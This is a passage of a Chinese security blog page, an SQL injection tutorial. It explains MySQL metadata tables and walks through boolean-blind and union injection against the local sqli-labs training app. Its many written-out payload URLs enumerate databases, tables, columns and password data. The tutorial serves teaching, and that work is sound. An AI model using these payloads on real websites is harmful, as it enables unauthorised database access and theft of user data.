@@ -1,0 +1,1847 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL注入详解, 谢公子的小黑屋">
+    <meta name="description" content="
+以下所有代码的环境：MySQL5.5.20+PHP
+
+SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>SQL注入详解 | 谢公子的小黑屋</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">谢公子的小黑屋</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/技术文章/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-chalkboard" style="zoom: 0.6;"></i>
+      
+      <span>技术文章</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags/Web%E6%BC%8F%E6%B4%9E/">
+          
+          <span>Web漏洞</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+          
+          <span>渗透测试</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
+          
+          <span>工具的使用</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/Windows/">
+          
+          <span>Windows系统</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+          
+          <span>漏洞复现</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/深度美文/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>深度美文</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags/%E4%BA%BA%E7%94%9F%E7%9C%9F%E7%90%86/">
+          
+          <span>人生真理</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/%E6%83%85%E6%84%9F/">
+          
+          <span>情感</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>文章分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">谢公子的小黑屋</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;" target="_blank" rel="noopener">
+			
+				<i class="fa-fw fas fa-chalkboard"></i>
+			
+			技术文章
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags/Web%E6%BC%8F%E6%B4%9E/ " style="margin-left:75px";>
+				  
+		          <span>Web漏洞</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ " style="margin-left:75px";>
+				  
+		          <span>渗透测试</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/ " style="margin-left:75px";>
+				  
+		          <span>工具的使用</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/tags/Windows/ " style="margin-left:75px";>
+				  
+		          <span>Windows系统</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ " style="margin-left:75px";>
+				  
+		          <span>漏洞复现</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;" target="_blank" rel="noopener">
+			
+				<i class="fa-fw fas fa-bookmark"></i>
+			
+			深度美文
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags/%E4%BA%BA%E7%94%9F%E7%9C%9F%E7%90%86/ " style="margin-left:75px";>
+				  
+		          <span>人生真理</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/tags/%E6%83%85%E6%84%9F/ " style="margin-left:75px";>
+				  
+		          <span>情感</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			文章分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1577021791329&di=ab7fdaa42ca183fd0670aa60a8759c94&imgtype=0&src=http%3A%2F%2Fqiniu.51mianshiguan.com%2Fwp-content%2Fuploads%2F2019%2F04%2Fu42687723171051638610fm27gp0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        SQL注入详解
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">Web漏洞</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" class="post-category">
+                                技术文章
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2018-08-23
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2019-12-22
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    10.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    41 分
+                </div>
+                
+				
+                
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>以下所有代码的环境：MySQL5.5.20+PHP</p>
+</blockquote>
+<p><strong>SQL注入</strong>是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。</p>
+<p>SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤。SQL注入是针对数据库、后台、系统层面的攻击！</p>
+<p>由于以下的环境都是MySQL数据库，所以先了解点MySQL有关的知识。在MySQL5.0之后，MySQL中默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<p>当尝试删除该数据库时，会爆出以下的错误！</p>
+<p><img src="https://img-blog.csdnimg.cn/20181215113337683.png" alt="img"></p>
+<p><strong>mysql中注释符</strong>：#   、/**/  、  – </p>
+<p><strong>information_schema数据库中三个很重要的表：</strong></p>
+<ul>
+<li>information_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名</li>
+<li>information_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名</li>
+<li>information_schema.columns:    该数据表存储了mysql数据库中的所有列的列名</li>
+</ul>
+<p>关于这几个表的一些语法：</p>
+<pre><code class="python">// 通过这条语句可以得到所有的数据库名  
+select schema_name from information_schema.schemata limit 0,1
+
+// 通过这条语句可以得到所有的数据表名
+select table_name from information_schema.tables limit 0,1
+// 通过这条语句可以得到指定security数据库中的所有表名
+select table_name from information_schema.tables where table_schema=&#39;security&#39;limit 0,1
+
+// 通过这条语句可以得到所有的列名
+select column_name from information_schema.columns limit 0,1
+// 通过这条语句可以得到指定数据库security中的数据表users的所有列名
+select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1
+
+//通过这条语句可以得到指定数据表users中指定列password的数据(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)
+select password from users limit 0,1</code></pre>
+<p><strong>mysql中比较常用的一些函数</strong>：</p>
+<ul>
+<li>version()： 查询数据库的版本          </li>
+<li>user()：查询数据库的使用者       </li>
+<li>database()：数据库</li>
+<li>system_user()：系统用户名</li>
+<li>session_user()：连接数据库的用户名</li>
+<li>current_user：当前用户名</li>
+<li>load_file()：读取本地文件</li>
+<li>@@datadir：读取数据库路径</li>
+<li>@@basedir：mysql安装路径</li>
+<li>@@version_complie_os：查看操作系统</li>
+</ul>
+<blockquote>
+<p><strong>ascii(str) :</strong> 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii(“a”)=97</p>
+</blockquote>
+<blockquote>
+<p><strong>length(str) :</strong> 返回给定字符串的长度，如  length(“string”)=6</p>
+</blockquote>
+<blockquote>
+<p><strong>substr(string,start,length) :</strong> 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr(“chinese”,3,2)=”in”</p>
+<p><strong>substr()、stbstring()、mid()</strong>  三个函数的用法、功能均一致</p>
+</blockquote>
+<blockquote>
+<p><strong>concat(username)：</strong>将查询到的username连在一起，默认用逗号分隔</p>
+<p><strong>concat(str1,’*‘,str2)</strong>：将字符串str1和str2的数据查询到一起，中间用*连接</p>
+<p><strong>group_concat(username) ：</strong>将username数据查询在一起，用逗号连接</p>
+</blockquote>
+<blockquote>
+<p><strong>limit 0,1</strong>：查询第1个数        <strong>limit  1,1</strong>： 查询第2个数             <strong>limit  n,1</strong>： 查询第n+1个数</p>
+</blockquote>
+<p>更多的关于SQL语句：<a href="https://blog.csdn.net/qq_36119192/article/details/82875868" target="_blank" rel="noopener">常见的SQL语句</a> </p>
+<h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><p><strong>依据注入点类型分类</strong></p>
+<ul>
+<li>数字类型的注入</li>
+<li>字符串类型的注入</li>
+<li>搜索型注入</li>
+</ul>
+<p><strong>依据提交方式分类</strong></p>
+<ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>COOKIE注入</li>
+<li>HTTP头注入(XFF注入、UA注入、REFERER注入）</li>
+</ul>
+<p><strong>依据获取信息的方式分类</strong></p>
+<ul>
+<li>基于布尔的盲注</li>
+<li>基于时间的盲注</li>
+<li>基于报错的注入</li>
+<li>联合查询注入</li>
+<li>堆查询注入 (可同时执行多条语句)</li>
+</ul>
+<h1 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h1><p>一个网站有那么多的页面，那么我们如何判断其中是否存在SQL注入的页面呢？我们可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。</p>
+<p>但是在很多时候，还是需要我们自己手动去判断是否存在SQL注入漏洞。下面列举常见的判断SQL注入的方式。但是目前大部分网站都对此有防御，真正发现网页存在SQL注入漏洞，还得靠技术和经验了。</p>
+<p><strong>一：</strong>二话不说，先加单引号’、双引号”、单括号）、双括号））等看看是否报错，如果报错就可能存在SQL注入漏洞了。</p>
+<p><strong>二：</strong>还有在URL后面加 and 1=1 、 and 1=2 看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。</p>
+<p><strong>三：</strong>还有就是Timing Attack测试，也就是时间盲注。有时候通过简单的条件语句比如 and 1=2 是无法看出异常的。</p>
+<p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
+<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。</p>
+<table>
+<thead>
+<tr>
+<th>MySQL</th>
+<th>benchmark(100000000,md(5))sleep(3)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PostgreSQL</td>
+<td>PG_sleep(5)Generate_series(1,1000000)</td>
+</tr>
+<tr>
+<td>SQLServer</td>
+<td>waitfor delay  ‘0:0:5’</td>
+</tr>
+</tbody></table>
+<p><strong>易出现SQL注入的功能点：</strong>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的 client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
+<h2 id="一：Boolean盲注"><a href="#一：Boolean盲注" class="headerlink" title="一：Boolean盲注"></a>一：Boolean盲注</h2><p>盲注，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的信息，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到了执行。</p>
+<p>我们来看一个例子：这是sqli的Less-5，我自己对源码稍微改动了一下，使得页面会显示执行的sql语句</p>
+<p>通过输入 <a href="http://127.0.0.1/sqli/Less-1/?id=1' target=" _blank" rel="noopener" ">http://127.0.0.1/sqli/Less-1/?id=1   </a>我们得到了下面的页面</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180902191155380.png" alt="img"></p>
+<p>然后输入 <a href="http://127.0.0.1/sqli/Less-5/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-5/?id=-1</a>   我们得到下面的页面</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180902210155815.png" alt="img"></p>
+<p>当我们输入  <a href="http://127.0.0.1/sqli/Less-5/?id=1' target=" _blank" rel="noopener" ">http://127.0.0.1/sqli/Less-5/?id=1</a>‘  我们得到下面的页面</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20181203195250882.png" alt="img"></p>
+<p>由此可以看出代码把 id 当成了字符来处理，而且后面还有一个限制显示的行数  limit 0,1 。当我们输入的语句正确时，就显示You are in….   当我们输入的语句错误时，就不显示任何数据。当我们的语句有语法错误时，就报出 SQL 语句错误。</p>
+<p>于是，我们可以推断出页面的源代码：</p>
+<pre><code class="sql">$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;    //sql查询语句
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+    if($row){                    //如果查询到数据
+            echo &#39;You are in...........&#39;;
+      }else{                      //如果没查询到数据
+         print_r(mysql_error());      
+    }</code></pre>
+<p>于是我们可以通过构造一些判断语句，通过页面是否显示来证实我们的猜想。盲注一般用到的一些函数：<strong>ascii()</strong> 、<strong>substr()</strong> 、<strong>length()，exists()、concat()等</strong></p>
+<p>1：判断数据库类型</p>
+<p>这个例子中出错页面已经告诉了我们此数据库是MySQL，那么当我们不知道是啥数据库的时候，如何分辨是哪个数据库呢？</p>
+<p>虽然绝大多数数据库的大部分SQL语句都类似，但是每个数据库还是有自己特殊的表的。通过表我们可以分辨是哪些数据库。</p>
+<p>MySQL数据库的特有的表是 <strong>information_schema.tables</strong>  , access数据库特有的表是 <strong>msysobjects</strong> 、SQLServer 数据库特有的表是 <strong>sysobjects</strong> 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
+<pre><code class="sql">//判断是否是 Mysql数据库
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from information_schema.tables) #
+
+//判断是否是 access数据库
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from msysobjects) #
+
+//判断是否是 Sqlserver数据库
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from sysobjects) #</code></pre>
+<p>对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<p><strong>information_schema.tables</strong> 存储了数据表的元数据信息，下面对常用的字段进行介绍：</p>
+<ul>
+<li>table_schema: 记录<strong>数据库名</strong>；</li>
+<li>table_name: 记录<strong>数据表名</strong>；</li>
+<li>table_rows: 关于表的粗略行估计；</li>
+<li>data_length : 记录<strong>表的大小</strong>（单位字节）；</li>
+</ul>
+<p>2：判断当前数据库名(以下方法不适用于access和SQL Server数据库)</p>
+<pre><code class="bash">1：判断当前数据库的长度，利用二分法
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5   //正常显示
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10   //不显示任何数据
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7   //正常显示
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8   //不显示任何数据
+
+大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为 8
+
+2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断
+//判断数据库的第一个字符
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),1,1))&gt;100
+
+//判断数据库的第二个字符
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),2,1))&gt;100
+
+...........
+由此可以判断出当前数据库为 security</code></pre>
+<p>3：判断当前数据库中的表</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from admin)   //猜测当前数据库中是否存在admin表
+1：判断当前数据库中表的个数
+// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;5 #
+
+2：判断每个表的长度
+//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6
+
+//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6
+
+3：判断每个表的每个字符的ascii值
+//判断第一个表的第一个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 #
+
+//判断第一个表的第二个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 #
+
+.........
+由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</code></pre>
+<p>4：判断表中的字段</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin)   //如果已经证实了存在admin表，那么猜测是否存在username字段
+1：判断表中字段的个数
+//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)&gt;5 #
+
+2：判断字段的长度
+//判断第一个字段的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5
+
+//判断第二个字段的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1))&gt;5
+
+3：判断字段的ascii值
+//判断第一个字段的第一个字符的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;100
+
+//判断第一个字段的第二个字符的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1))&gt;100
+
+...........
+由此可判断出users表中存在 id、username、password 字段</code></pre>
+<p>5.判断字段中的数据</p>
+<pre><code class="sql">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据
+
+1: 判断数据的长度
+// 判断id字段的第一个数据的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 0,1))&gt;5
+
+// 判断id字段的第二个数据的长度
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 1,1))&gt;5
+
+2：判断数据的ascii值
+// 判断id字段的第一个数据的第一个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),1,1))&gt;100
+
+// 判断id字段的第一个数据的第二个字符的ascii值
+http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),2,1))&gt;100
+
+...........</code></pre>
+<h2 id="二：union-注入"><a href="#二：union-注入" class="headerlink" title="二：union 注入"></a>二：union 注入</h2><p>union联合查询适用于有显示列的注入。</p>
+<p>我们可以通过order by来判断当前表的列数。最后可得知，当前表有3列</p>
+<p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> order by 3 #</p>
+<p>我们可以通过 union 联合查询来知道显示的列数</p>
+<p>[127.0.0.1/sqli/Less-1/?id=1’ union select 1 ,2 ,3 #](<a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> union select 1 ,2 ,3 %23)</p>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180823213715280.png" alt="img"></p>
+<p>咦，这里为啥不显示我们联合查询的呢？因为这个页面只显示一行数据，所以我们可以用 and 1=2 把前面的条件给否定了，或者我们直接把前面 id=1 改成 id =-1 ,在后面的代码中，都是将 id=-1进行注入</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=1&#39; and 1=2 union select 1,2,3 #
+
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,3 #</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180825121820169.png" alt="img"></p>
+<p>这样，我们联合查询的就显示出来了。可知，第2列和第3列是显示列。那我们就可以在这两个位置插入一些函数了。</p>
+<p>我们可以通过这些函数获得该数据库的一些重要的信息</p>
+<p>version() ：数据库的版本     database() :当前所在的数据库    @@basedir :  数据库的安装目录</p>
+<p>@@datadir ： 数据库文件的存放目录     user() ： 数据库的用户   current_user() : 当前用户名</p>
+<p>system_user() : 系统用户名     session_user() :连接到数据库的用户名</p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,version(),user() #</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180825121849152.png" alt="img"></p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=-1&#39;  union select 1,database(),@@basedir #</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180825121952187.png" alt="img"></p>
+<pre><code class="sql">http://127.0.0.1/sqli/Less-1/?id=-1&#39;   union select 1,@@datadir,current_user() #</code></pre>
+<p><img src="/2018/08/23/sql-zhu-ru-lou-dong-xiang-jie/20180825122028800.png" alt="img"></p>
